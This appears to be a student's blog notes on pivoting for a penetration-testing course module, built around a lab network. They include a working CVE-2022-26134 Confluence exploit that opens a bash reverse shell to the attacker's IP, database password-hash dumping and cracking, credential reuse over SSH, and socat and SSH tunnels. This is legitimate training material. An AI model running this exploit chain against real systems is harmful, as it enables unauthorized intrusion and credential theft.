---
title: "PEN-200 Module 18 \u2014 Pivoting With SSH and Port Redirection"
slug: pivoting-ssh
author: m4xx3d0ut
summary: Pivoting binds the lab together. These notes expand the quick summary with
  concrete commands, configuration snippets, and operational guardrails.
publishedAt: '2023-11-06'
updatedAt: '2024-03-14'
readingMinutes: 85
tags:
- offsec
---
# PEN-200 Module 18 — Pivoting With SSH and Port Redirection

## TLDR;

Pivoting binds the lab together. These notes expand the quick summary with concrete commands, configuration snippets, and operational guardrails.

### Socat & Native Forwarders

```
# Simple local forward through a compromised Linux host
socat TCP-LISTEN:8080,fork TCP:10.10.10.25:80

# Wrap plaintext protocol with TLS
autosocat TCP-LISTEN:2525,fork OPENSSL:mail.internal.local:25,verify=0
```

- Keep a `pivots.md` log: source host, listener port, destination, purpose.
- For Windows, `plink.exe -L 8080:10.10.10.25:80 user@pivot` or `netsh interface portproxy add v4tov4 listenport=8080 connectaddress=10.10.10.25 connectport=80`.

### SSH Local, Remote, and Dynamic

```
# Local forwarding (remote service ➜ local port)
ssh -L 9001:10.10.20.5:445 analyst@pivot.corp.local -N

# Dynamic SOCKS proxy for full tunnels
ssh -D 1080 analyst@pivot.corp.local -C -N

# Remote forwarding (internal service ➜ attack box)
ssh -R 8443:10.10.30.15:443 pivot@command-node
```

- Use `~/.ssh/config` to chain pivots cleanly:

```
Host pivot
    HostName 192.168.119.50
    User analyst
    ProxyCommand ssh jump "nc -q0 %h %p"
Host dc01
    HostName dc01.corp.local
    User backupuser
    ProxyJump pivot
```

- Combine with `proxychains` or `torsocks` when tools only speak SOCKS.

### Persistence & Reliability

- `autossh -M 0 -f -N -o "ServerAliveInterval 30" -o "ServerAliveCountMax 3" -L ...` keeps tunnels alive.
- Monitor tunnel health: `ss -tnlp | grep 9001`, `lsof -i :1080`.
- Use unique ports per pivot host to avoid confusion.

### Layering Tunnels

- Chain dynamic proxies (`ssh -D 1080` ➜ `proxychains nmap -sT`) for deep internal scanning.
- Leverage `socat TCP4-LISTEN:2222,fork SOCKS4:127.0.0.1:10.10.40.5:22,socksport=1080` to combine protocols.
- Document routes in a graph (host ➜ pivot ➜ target) for the final report.

### Cleanup & Defense

- Close tunnels after use (`kill $(pgrep -f 'ssh -L 9001')`), remove `netsh` portproxies.
- Recommend clients monitor for long-lived SSH sessions, unusual port proxies, and hosts listening on atypical ports.

Pivot discipline keeps you from losing track of connectivity and helps defenders understand exactly how you traversed their network.

## Working Notes... In Graphic Detail...

### Port Redirection and SSH Tunneling
 
- Port Forwarding on *NIX and Windows Machines.
- SSH Tunneling on (and between) *NIX and Windows Machines.

#### 18.1 Why Port Redirection and Tunneling?

This unit covers:
 
- Understand the difference between common network layouts.
- Consider the impact of common network security devices.
- Understand when to use port redirection and tunneling techniques.

Most network envs are not, or should not be, [flat](https://en.wikipedia.org/wiki/Flat_network).  All devices in a flat network are able to comm with one another.  There is little/no limitations on the access each device has to another, regardless of the need for them to comm under normal operations.

Flat network topology is bad security practice.  If an attacker accesses a single host, they can comm every other host, making it much easier to move through the network.

A more secure design is the [segmented](https://en.wikipedia.org/wiki/Network_segmentation) network, where a network is broken down into smaller subnets, each containing groups of devices with specific purposes, where devices only have access to the subnets and devices require for their use case.  Compromising a single host, will not allow an attacker access to all other systems on the network.

As part of the network segmentation process, admins often implement controls that limit the flow of traffic in/out and across their network.  Various tech is deployed across the network to enforce it.

One of the most common technologies are [Firewalls](https://en.wikipedia.org/wiki/Firewall_(computing)), they can be implemented at the endpoint software level.  As an example, the Linux kernel has firewall capabilities through the [iptables](https://en.wikipedia.org/wiki/Iptables) tool suite, while Windows has the built-in [Windows Defender Firewall](https://learn.microsoft.com/en-us/windows/security/threat-protection/windows-firewall/windows-firewall-with-advanced-security).  They can also be implemented with physical appliances, such as hardware firewalls filtering network traffic.

Firewalls can drop inbound traffic and prevent malicious traffic from traversing/leaving the network.  They can prevent all but a few allowed hosts from comm with a port on a priv server.  They can also block some hosts/subnets from accessing the internet.

Most firewalls are rule based, which limits their functionality.  In cases where fine control is required [Deep Packet Inspection](https://en.wikipedia.org/wiki/Deep_packet_inspection) systems monitor the contents of in/out bound traffic and can terminate it based on a set of rules.

Admins put boundaries in place to prevent the arbitrary movement of data in/out/across the network.  As an attacker, we need to traverse these boundaries by developing strategies that can help us work around them.

Port redirection, a term used to describe various methods of port forwarding, and tunneling are both viable strategies to we can use to traverse these boundaries.  
- Port redirection.
 - Modify the flow of network traffic so packets sent to one socket will be passed to another.
- Tunneling.
 - Encapsulating one type of data stream within another.
 - Example, transport HTTP traffic within a SSH conn to only the SSH traffic is visible externally.

We will introduce port redirection and tunneling techniques through practical examples.  Starting with the lowest complexity techniques and increase complexity as we move step-by-step towards more hardened network envs.  Each new technique will be applied to a new network config that is slightly different than the prior.  We will cover SSH tunneling in this module and more advanced methods in later modules.

[Logical typologies](https://en.wikipedia.org/wiki/Network_topology) we create while chaining methods may be difficult to conceptualize at first, we will be making the traffic move in ways that may not appear intuitive, so we should take time to fully understand each technique before advancing to the next.  We will learn the tools required to manipulate the flow of traffic in any given network with surgical precision.

#### 18.2 Port Forwarding with Linux Tools
 
- Understand what port forwarding is.
- Learn when to use port forwarding techniques.
- Use Socat to set up a port forward in Linux.

We will examine the fundamental technique of port forwarding, commonly used in general purpose networking.  We configure a host to listen on one port and relay all packets received to another dest.

Under normal conditions, admins may use this to allow access to a web server behind a firewall, listening on one iface, and passing all packets to the web server behind it.  Most home routers also provide this functionality.

How can we use this are part of the attack chain?  Next we'll consider a simple scenario.

##### A Simple Port Forwarding Scenario

Let's examine a port forwarding scenario.  In an assessment, we find a Linux web server running a version of Confluence vulnerable to [CVE-2022-26134](https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html), a pre auth RCE vuln.  We can exploit it to gain a reverse shell from the server.

During enum, we find that this server has two network ifaces, one on the same network as our Kali machine and another on an internal subnet.  In the Confluence config file, we also find creds and the IP address/Port for a PostgresSQL DB instance running on a server on the internal subnet.  We want to use these creds to gain access to the DB and enum further.

We are on the WAN side of this network with the second iface connected to a DMZ.  The PGDATABASE01 is in the DMZ and the Confluence server CONFLUENCE01 stradles both networks.

A WAN is a large expansive network, the public internet is the world's largest WAN.  Some large orgs refer to their internal networks as a WAN or internal WAN.  Our WAN can represent the internet of a large internal WAN.
*Throughout the exercises in this Module, our Kali machine will be situated in the WAN. We will only be able to route directly from our Kali machine to hosts that are also on the WAN.*

A DMZ is a network containing devices exposed to wider, less trusted, networks.  The DMZ creates a buffer between external and internal hosts, similar to a real worl Demilitarized Zone.

CONFLUENCE01 straddles both WAN and DMZ allowing it to communicate on both networks.  It is listening on TCP port 8090.

PGDATABASE01 is within the DMZ boundary, it does not straddle the WAN/DMZ.  Our Kali machine cannot is not within the DMZ and cannot directly comm with it.  It has TCP port 5432 open, listening on the default port.

*Since the only thing we know about PGDATABASE01 so far is that it exists, we don't yet know if it's attached to any other networks. If later we find that PGDATABASE01 is attached to other networks, we will expand our network diagram.*

We want to use the creds we found on CONFLUENCE01 to connect to PostgresSQL from our Kali machine.  Let's setup our lab env to recreate the scenario we described.

*At the end of the Port Forwarding with Socat section of this Learning Unit, a group of VMs are provided that can be used to follow along with the following sections. These VMs are provided so you can gain hands-on experience with all the techniques we cover. You can start the VM group at any point and follow along at whatever pace feels comfortable.*

##### Setting Up the Lab Environment

To gain access to CONFLUENCE01 we have to utilize RCE vuln in the web app to obtain a reverse shell.  We find it is vulnerable to CVE-2022-26134 and refer to a [Rapid7 PoC payload](https://www.rapid7.com/blog/post/2022/06/02/active-exploitation-of-confluence-cve-2022-26134/) that exploits and returns a reverse shell.
```bash
curl -v http://10.0.0.28:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/10.0.0.28/1270%200%3E%261%27%29.start%28%29%22%29%7D/
```
- We must first understand what the payload is doing.

The curl requests:
- Verbose `-v`
- Made to host `http://10.0.0.2:8090`
 - Assume to be the authors vulnerable Confluence server.
- There are URL encoded chars, we must decode to understand.
```
/${new javax.script.ScriptEngineManager().getEngineByName("nashorn").eval("new java.lang.ProcessBuilder().command('bash','-c','bash -i >& /dev/tcp/10.0.0.28/1270 0>&1').start()")}/
```
- The URL path is an OGNL injection payload.
 - Object-Graph Notation Language.
  - An expression language used in Java apps.
  - Takes place when app handles user inputs by passing them to OGNL expression parser.
 - It's possible to exec Java code within OGNL expressions and can be used to exec arbitrary code.
- The payload itself uses Java's [ProcessBuilder class](https://docs.oracle.com/javase/7/docs/api/java/lang/ProcessBuilder.html)
 - Spawns a Bash interactive rev shell `bash -i`

The PoC meets our needs, we modify it to point at our lab machine and to return the shell to our Kali machine.  Be aware that *all of the chars are not URL encoded* (".", "/").  This is not always the case, but important to the functionality of this payload.  If those chars are encoded the server will parse the request differently and the payload may not exec.  So, we cannot apply URL encoding across the entire payload once modified.
- We manually modify the params as needed.
 - The Confluence server IP.
 - Bash payload IP and Port.
 - Remove the verbose flag.
```bash
curl http://192.168.198.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.182/4444%200%3E%261%27%29.start%28%29%22%29%7D/
```
- We can now start our Netcat listener on our Kali machine.
```bash
┌──(operator㉿labhost)-[~/OffSec/redir-tunneling]
└─$ nc -nvlp 4444
listening on [any] 4444 ...
```
- We can now run the modified curl command.
- The reverse shell has returned.
```
listening on [any] 4444 ...
connect to [192.168.45.182] from (UNKNOWN) [192.168.198.63] 51262
bash: cannot set terminal process group (2653): Inappropriate ioctl for device
bash: no job control in this shell
bash: /root/.bashrc: Permission denied
confluence@confluence01:/opt/atlassian/confluence/bin$ id
id
uid=1001(confluence) gid=1001(confluence) groups=1001(confluence)
```
- The shell is running with the privs of the Confluence server.

We can now begin to enum CONFLUENCE01, check the network ifaces with `ip addr`.
```bash
confluence@confluence01:/opt/atlassian/confluence/bin$ ip addr
ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
4: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:bf:bd:21 brd ff:ff:ff:ff:ff:ff
    inet 192.168.198.63/24 brd 192.168.198.255 scope global ens192
       valid_lft forever preferred_lft forever
5: ens224: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:bf:1d:86 brd ff:ff:ff:ff:ff:ff
    inet 10.4.198.63/24 brd 10.4.198.255 scope global ens224
       valid_lft forever preferred_lft forever
```
- We find two network iface on two networks.
	- `ens192` with IP `192.168.198.63`
	- `ens224` with IP `10.4.198.63`
- Next we check routes with `ip route`
```bash
confluence@confluence01:/opt/atlassian/confluence/bin$ ip route
ip route
default via 192.168.198.254 dev ens192 proto static 
10.4.198.0/24 dev ens224 proto kernel scope link src 10.4.198.63 
192.168.198.0/24 dev ens192 proto kernel scope link src 192.168.198.63 
```

We then find the Confluence config at `/var/atlassian/application-data/confluence/confluence.cfg.xml` and discover some DB creds.
```bash
confluence@confluence01:/opt/atlassian/confluence/bin$ cat /var/atlassian/application-data/confluence/confluence.cfg.xml
<sian/application-data/confluence/confluence.cfg.xml   
<?xml version="1.0" encoding="UTF-8"?>

...
    <property name="hibernate.connection.password">D@t4basePassw0rd!</property>
    <property name="hibernate.connection.url">jdbc:postgresql://10.4.198.215:5432/confluence</property>
    <property name="hibernate.connection.username">postgres</property>
...
```
- We found an IP address of a DB server.
 - We can use those creds to conn to it.
- However we have hit a limitation.
 - CONCLUENCE01 does not have a PostgreSQL client.
 - We are a low priv user and cannot easily install software.

We do have a PostgresSQL client on our Kali machine, but no direct path to PGDATABASE01 sine it is only routable from CONFLUENCE01.  In this case, there is no firewall in between us and CONFLUENCE01 so nothing is stopping us from binding ports on the WAN iface and connecting to them from our Kali machine.

This is the type of situation in which port forwarding can be used.  We can create a port forward on the WAN iface of CONFLUENCE01 that forwards all packets received to the PGDATABASE01 server on the internal subnet.

##### Port Forwarding with Socat

We want to create a port forward where CONFLUENCE01 listens on a WAN port and then forwards all packets received on the port to PGDATABASE01 on the internal subnet.
- Open TCP port 2345 on the WAN iface of CONFLUENCE01.
 - Connect to it from our Kali machine.
- Forward all packets from that port to TCP 5432 on PGDATABASE01.
- Once setup, connecting to 2345 will be the same as connecting directly to 5432.

As part of enum on CONFLUENCE01, we find Socat installed, which is capable of simple port forwards.
*In this scenario, we find it already installed, but Socat does not tend to be installed by default on *NIX systems. If not already installed, it's possible to download and run a statically-linked binary version instead.*

- On CONFLUENCE01 we start a Socat proc.
 - Verbose `-ddd`
 - Listen on TCP port 2345 `TCP-LISTEN:2345`
 - Fork into subproc when new conn received `fork`
  - Instead of dying after single conn.
 - Then forward all traffic to 5432 on PGDATABASE01 `TCP:10.4.198.215`
*We'll listen on port 2345 as it's not in the privileged port range (0-1024), which means we don't need elevated privileges to use it.*
```bash
confluence@confluence01:/opt/atlassian/confluence/bin$ socat -ddd TCP-LISTEN:2345,fork TCP:10.4.198.215:5432
<cat -ddd TCP-LISTEN:2345,fork TCP:10.4.198.215:5432   
2023/11/06 15:59:52 socat[4559] I socat by Gerhard Rieger and contributors - see www.dest-unreach.org
2023/11/06 15:59:52 socat[4559] I This product includes software developed by the OpenSSL Project for use in the OpenSSL Toolkit. (http://www.openssl.org/)
2023/11/06 15:59:52 socat[4559] I This product includes software written by Tim Hudson (tjh@cryptsoft.com)
2023/11/06 15:59:52 socat[4559] I setting option "fork" to 1
2023/11/06 15:59:52 socat[4559] I socket(2, 1, 6) -> 5
2023/11/06 15:59:52 socat[4559] I starting accept loop
2023/11/06 15:59:52 socat[4559] N listening on AF=2 0.0.0.0:2345
```
- Now that the proc is running we can use `psql` from our Kali machine.
 - Conn to CONFLUENCE01 `-h 192.168.198.63`
 - Port 2345 `-p 2345`
 - With postgres user account `-U postgres`
- Enter password when prompted `D@t4basePassw0rd!`
- Upon conn run the `\l` command to list avail DB.
```bash
┌──(operator㉿labhost)-[~/OffSec/redir-tunneling]
└─$ psql -h 192.168.198.63 -p 2345 -U postgres
Password for user postgres: 
psql (15.4 (Debian 15.4-1), server 12.12 (Ubuntu 12.12-0ubuntu0.20.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, compression: off)
Type "help" for help.

postgres=# \l
                                                  List of databases
    Name    |  Owner   | Encoding |   Collate   |    Ctype    | ICU Locale | Locale Provider |   Access privileges   
------------+----------+----------+-------------+-------------+------------+-----------------+-----------------------
 confluence | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 |            | libc            | 
 postgres   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 |            | libc            | 
 template0  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 |            | libc            | =c/postgres          +
            |          |          |             |             |            |                 | postgres=CTc/postgres
 template1  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 |            | libc            | =c/postgres          +
            |          |          |             |             |            |                 | postgres=CTc/postgres
(4 rows)
```
- We have successfully conn to the PostgresSQL DB through out port forward.
 - We also have access to our `confluence` DB.

With out new access we can continue enum, let's query the `cwd_user` table, which contains the username and password hashes for all Confluence users.
- Connect to the DB with `\c confluence`
 - Review contents with `select * from cwd_user;`
```
confluence=# select * from cwd_user;

   id   |   user_name    | lower_user_name | active |      created_date       |      updated_date       | first_name | lower_first_name |   last_name   | lower_last_name |      display_name      |   lower_display_name   |           email_
address            |        lower_email_address         |             external_id              | directory_id |                                credential                                 
--------+----------------+-----------------+--------+-------------------------+-------------------------+------------+------------------+---------------+-----------------+------------------------+------------------------+-----------------
-------------------+------------------------------------+--------------------------------------+--------------+---------------------------------------------------------------------------
 229377 | admin          | admin           | T      | 2022-09-09 21:10:26.365 | 2022-09-09 21:10:26.365 | Alice      | alice            | Admin         | admin           | Alice Admin            | alice admin            | alice@industries.internal          | alice@industries.internal          | d9da2333-8bd1-4a8e-82d3-0613aead5d22 |        98305 | {PKCS5S2}3vfgC35A7Gnrxlzbvp32yM8zXvdE8U8bxS9bkP+3aS3rnSJxz4bJ6wqtE8d95ejA
 229378 | trouble        | trouble         | T      | 2022-09-09 21:13:04.598 | 2022-09-09 21:13:04.598 |            |                  | Trouble       | trouble         | Trouble                | trouble                | trouble@industries.internal        | trouble@industries.internal        | 84bcf8cf-618d-4bec-b5c0-1b4a21fbcd6b |        98305 | {PKCS5S2}tnbti4h38VDOh0xPrBHr7JBYjev7wws+ETHL1YyjSpIWVUz+66zXwDvbBJkJz342
 229379 | happiness      | happiness       | T      | 2022-09-09 21:13:35.831 | 2022-09-09 21:13:35.831 |            |                  | Happiness     | happiness       | Happiness              | happiness              | happiness@industries.internal      | happiness@industries.internal      | 8b9c660a-cfee-48ac-8214-737df1786dd2 |        98305 | {PKCS5S2}1hCLEv054BGYa9QkCAZKSmotKb4d8WbuDc/gGxHngs0cL3+fJ4OmCt6+fUM6HYlc
 229380 | hr_admin       | hr_admin        | T      | 2022-09-09 21:13:58.548 | 2022-09-09 21:13:58.548 | HR         | hr               | Admin         | admin           | HR Admin               | hr admin               | hr_admin@industries.internal       | hr_admin@industries.internal       | 0d31acb5-ba51-4725-ae64-ae7f5d51becc |        98305 | {PKCS5S2}aBZZw3HfmgYN3Dzg/Pg7GjagLdo+eRg+0JCCVId/KyNT4oVlNbhWPJtJNazs4F5R
 229381 | database_admin | database_admin  | T      | 2022-09-09 21:14:22.459 | 2022-09-09 21:14:22.459 | Database   | database         | Admin Account | admin account   | Database Admin Account | database admin account | database_admin@industries.internal | database_admin@industries.internal | 93d97033-f7d4-4a3c-80f4-55cc5faf03c7 |        98305 | {PKCS5S2}ueMu+nTGBtfeGXGBlXXFcJLdSF4uVHkZxMQ1Bst8wm3uhZcDs56a2ProZiSOk2hv
 229382 | rdp_admin      | rdp_admin       | T      | 2022-09-09 21:14:46.153 | 2022-09-09 21:14:46.153 | RDP        | rdp              | Admin         | admin           | RDP Admin              | rdp admin              | rdp_admin@industries.internal      | rdp_admin@industries.internal      | a8f8d9b5-dfcb-480b-b461-8efce939294c |        98305 | {PKCS5S2}vCcYx3LxTYB2KH2Sq4wLNLdAcS+4lX/yTQrvBJngifUEXcnIUHEwW0YnOe86W8tP
(6 rows)
```
- Each row contains data of a single Confluence user, including password hash.
- We will attempt to crack with Hashcat.
 - Mode for Atlassian (PBKDF2-HMAC-SHA1) hashes is `12001`
  - Pass to `-m` flag.
 - Copy hashes into `hashes.txt` and pass as first positional arg.
 - The pass Kali included `pastcrack.txt` passwd list as final pos arg.
```bash
┌──(operator㉿labhost)-[~/OffSec/redir-tunneling]
└─$ hashcat -m 12001 hashes.txt /usr/share/wordlists/fasttrack.txt 
hashcat (v6.2.6) starting

...

Dictionary cache built:
* Filename..: /usr/share/wordlists/fasttrack.txt
* Passwords.: 222
* Bytes.....: 2006
* Keyspace..: 222
* Runtime...: 0 secs

The wordlist or mask that you are using is too small.
This means that hashcat cannot use the full parallel power of your device(s).
Unless you supply more work, your cracking speed will drop.
For tips on supplying more work, see: https://hashcat.net/faq/morework

Approaching final keyspace - workload adjusted.           

{PKCS5S2}aBZZw3HfmgYN3Dzg/Pg7GjagLdo+eRg+0JCCVId/KyNT4oVlNbhWPJtJNazs4F5R:Welcome1234
{PKCS5S2}vCcYx3LxTYB2KH2Sq4wLNLdAcS+4lX/yTQrvBJngifUEXcnIUHEwW0YnOe86W8tP:P@ssw0rd!
{PKCS5S2}ueMu+nTGBtfeGXGBlXXFcJLdSF4uVHkZxMQ1Bst8wm3uhZcDs56a2ProZiSOk2hv:sqlpass123
                                                          
Session..........: hashcat
Status...........: Exhausted
Hash.Mode........: 12001 (Atlassian (PBKDF2-HMAC-SHA1))
Hash.Target......: hashes.txt
Time.Started.....: Mon Nov  6 08:23:42 2023 (0 secs)
Time.Estimated...: Mon Nov  6 08:23:42 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/fasttrack.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    12099 H/s (0.34ms) @ Accel:1024 Loops:256 Thr:1 Vec:16
Recovered........: 3/6 (50.00%) Digests (total), 3/6 (50.00%) Digests (new), 3/6 (50.00%) Salts
Progress.........: 1332/1332 (100.00%)
Rejected.........: 0/1332 (0.00%)
Restore.Point....: 222/222 (100.00%)
Restore.Sub.#1...: Salt:5 Amplifier:0-1 Iteration:9984-9999
Candidate.Engine.: Device Generator
Candidates.#1....: Spring2017 -> starwars
Hardware.Mon.#1..: Temp: 58c Util: 17%

Started: Mon Nov  6 08:23:23 2023
Stopped: Mon Nov  6 08:23:43 2023
```
- Hashcat returns the password for.
	- `database_admin`
	- `hr_admin`
	- `rdp_admin`
- We suspect these passwords may be reused elsewhere on the network.
 - After additional enum we find PGDATABASE01 is also running an SSH server.
  - Let's try the creds against SSH by creating a port forward allowing direct SSH from out Kali machine.
- Kill our original Socat proc and create a new port forward.
 - Listen on TCP port 2222.
 - Forward to TCP port 22 on PGDATABASE01.
```bash
confluence@confluence01:/opt/atlassian/confluence/bin$ socat -ddd TCP-LISTEN:2222,fork TCP:10.4.198.215:22
<socat -ddd TCP-LISTEN:2222,fork TCP:10.4.198.215:22   
2023/11/06 16:33:56 socat[5407] I socat by Gerhard Rieger and contributors - see www.dest-unreach.org
2023/11/06 16:33:56 socat[5407] I This product includes software developed by the OpenSSL Project for use in the OpenSSL Toolkit. (http://www.openssl.org/)
2023/11/06 16:33:56 socat[5407] I This product includes software written by Tim Hudson (tjh@cryptsoft.com)
2023/11/06 16:33:56 socat[5407] I setting option "fork" to 1
2023/11/06 16:33:56 socat[5407] I socket(2, 1, 6) -> 5
2023/11/06 16:33:56 socat[5407] I starting accept loop
2023/11/06 16:33:56 socat[5407] N listening on AF=2 0.0.0.0:2222
```
- We can now conn to port 2222 of CONFLUENCE01 as if we conn directly to port 22 of PGDATABASE01.
 - Us the `database_admin` user and password retrieved from Hashcat.
		- `sqlpass123`
```bash
┌──(operator㉿labhost)-[~/OffSec/redir-tunneling]
└─$ ssh -o PubKeyAuthentication=no database_admin@192.168.198.63 -p2222
database_admin@192.168.198.63's password: 
Permission denied, please try again.
database_admin@192.168.198.63's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-125-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon 06 Nov 2023 04:38:41 PM UTC

  System load:  0.0               Processes:               234
  Usage of /:   80.5% of 6.79GB   Users logged in:         0
  Memory usage: 15%               IPv4 address for ens192: 10.4.198.215
  Swap usage:   0%                IPv4 address for ens224: 172.16.198.254


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Thu Feb 16 21:49:42 2023 from 10.4.50.63
database_admin@pgdatabase01:~$
```
- We have successfully connected.
 - The `database_admin` creds have been reused here.
 - We conn to the SSH server of PGDATABASE01 using creds found in PostgresSQL DB through port forward we setup on CONFLUENCE01 with Socat.

Socat is not the only way to setup a port forward on Unix like hosts.  Several alternatives are:
- [rinetd](https://github.com/samhocevar/rinetd)
 - Runs as daemon.
 - Better for longer term port forward situations.
 - Slightly unwieldy for short term.
- Netcat with [FIFO](https://man7.org/linux/man-pages/man7/fifo.7.html)
 - Named pipe to create [port forward](https://gist.github.com/holly/6d52dd9addd3e58b2fd5)
- Iptables.
 - If we have `root`
 - Depends on config already in place.
 - Forwarding packets requires enable port forwarding on the iface.
  - Write `1` to `/proc/sys/net/ipv4/conf/[interface]/forwarding`

###### Exercises

Capstone Exercise: Use the password found in the previous question to create a new port forward on CONFLUENCE01 and gain SSH access to PGDATABASE01 as the database_admin user. What's the value of the flag found in /tmp/socat_flag on PGDATABASE01?
```bash
database_admin@pgdatabase01:~$ cat /tmp/socat_flag
OS{4a06dc0b7935c1dd07544f26356ed1ab}
```


#### 18.3 SSH Tunneling
 
- Learn the fundamentals of SSH tunneling.
- Use SSH local, dynamic, remote, and remote dynamic port forwarding methods.
- Understand the pros and cons of using sshuttle.

"Tunneling" is the act of encapsulating one kind of data stream in another as it traverses the network.  There are [tunneling protocol](https://en.wikipedia.org/wiki/Tunneling_protocol) designed for this.  SSH is an example of one.

SSH was developed to give admins a way to remotely login to their servers through encrypted conns.  Before SSH tools like `rsh`, `rlogin`, and `telent` provided a simlar but unencrypted functionality.

All data is transported through an encrypted tunnel build in the background by the SSH session.  As it is primarily a tunneling proto, you can pass almost any kind of traffic through an SSH conn.

SSH blends into the background traffic of network envs, often legitimately used by network admins.  It is common to find SSH client installed on Linux hosts and SSH servers running.  It's also becoming more common to find OpenSSH clients on Win hosts.  In networks without heavy monitoring SSH traffic will not seem anomalous and the contents of the tunnel cannot be easily monitored.

In most official docs SSH tunneling is referred to as [SSH port forwarding](https://www.ssh.com/academy/ssh/tunneling-example#what-is-ssh-port-forwarding,-aka-ssh-tunneling?), different SSH software will vary in their tunneling capabilities.  We will cover OpenSSH in this unit.

##### SSH Local Port Forwarding

In the first port forwarding scenario with Socat, we setup Socat to listen on port 2345 on the WAN iface of CONFLUENCE01.  Packets received on that port were forwarded to TCP port 5432 on PGDATABASE01.  This allowed us to connect from out Kali machine, through CONFLUENCE01, to the PostgresSQL server PGDATABASE01.  The crucial thing to notice in this case is listening/forwarding ports were done from the same host, CONFLUENCE01.

[SSH local port forwarding](https://man.openbsd.org/ssh#L) adds a twist, packets are not forwarded by the same host that listens for packets.  A SSH conn is made between two hosts, client and server, a listening port is opened by the SSH client, and all packets received on this port are tunneled through the SSH connection to the SSH server.  The packets are forwarded by the SSH server to the socket we specify.

Reconsider the prior example with a difference, Socat is no longer available on CONFLUENCE01.  We still have the creds we cracked and there is no firewall preventing us from conn to the ports we bind to on CONFLUENCE01.

With `database_admin` creds, we log in to PGDATABASE01 and find that it's attached to another internal subnet.  We find a host with a SMB server open on TCP port 445 in that subnet.  We want to conn to that host from our Kali machine and download what we find.

For this, we plan to create an SSH local port forward as part of our SSH con from CONFLUENCE01 to PGDATABASE01.  We will bind a listening port on the WAN iface of CONFLUENCE01, forwarding all packets sent to that port through the SSH tunnel.  PGDATABASE01 will then forward these packets to the SMB port on the new host we found.

- From CONFLUENCE01.
 - We listen on TCP port 4455.
 - Packets sent to that port are pushed by SSH client software on CONFLUENCE01 through the SSH tunnel.
 - On the other end, SSH server software on PGDATABASE01 forwards them to TCP port 445 on the new host.

As we did previously, we can get a shell on CONFLUENCE01 using the cURL one-liner exploit for CVE-2022-26134.  We cannot use Socat to create the port forward, but we can in this case SSH directly from CONFLUENCE01 to PGDATABASE01.

Before setting up the port forward, we need to know which IP address and port we want the packets forwarded to.  First we SSH into PGDATABASE01 to start enum.

In our CONFLUENCE01 shell we make sure we have TTY functionality using Python3 pty module.  We can then SSH into PGDATABASE01 with the `database_admin` creds `sqlpass123`.
- `python3 -c 'import pty; pty.spawn("/bin/sh")'`
- `ssh database_admin@10.4.249.215`
```bash
┌──(operator㉿labhost)-[~/OffSec/redir-tunneling]
└─$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.45.182] from (UNKNOWN) [192.168.249.63] 46608
bash: cannot set terminal process group (2201): Inappropriate ioctl for device
bash: no job control in this shell
bash: /root/.bashrc: Permission denied
confluence@confluence01:/opt/atlassian/confluence/bin$ python3 -c 'import pty; pty.spawn("/bin/sh")'
</bin$ python3 -c 'import pty; pty.spawn("/bin/sh")'   
$ ssh database_admin@10.4.249.215
ssh database_admin@10.4.249.215
Could not create directory '/home/confluence/.ssh'.
The authenticity of host '10.4.249.215 (10.4.249.215)' can't be established.
ECDSA key fingerprint is SHA256:GMUxFQSTWYtQRwUc9UvG2+8toeDPtRv3sjPyMfmrOH4.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
yes
Failed to add the host to the list of known hosts (/home/confluence/.ssh/known_hosts).
database_admin@10.4.249.215's password: Welcome123

Permission denied, please try again.
database_admin@10.4.249.215's password: sqlpass123

Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-125-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue 07 Nov 2023 03:22:39 PM UTC

  System load:  0.0               Processes:               234
  Usage of /:   80.4% of 6.79GB   Users logged in:         0
  Memory usage: 15%               IPv4 address for ens192: 10.4.249.215
  Swap usage:   0%                IPv4 address for ens224: 172.16.249.254


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Thu Feb 16 21:49:42 2023 from 10.4.50.63
database_admin@pgdatabase01:~$
```
- We now have a SSH conn to PGDATABASE01 from CONFLUENCE01, we can start enum.
- Run `ip addr` to query network ifaces.
```bash
database_admin@pgdatabase01:~$ ip addr
ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
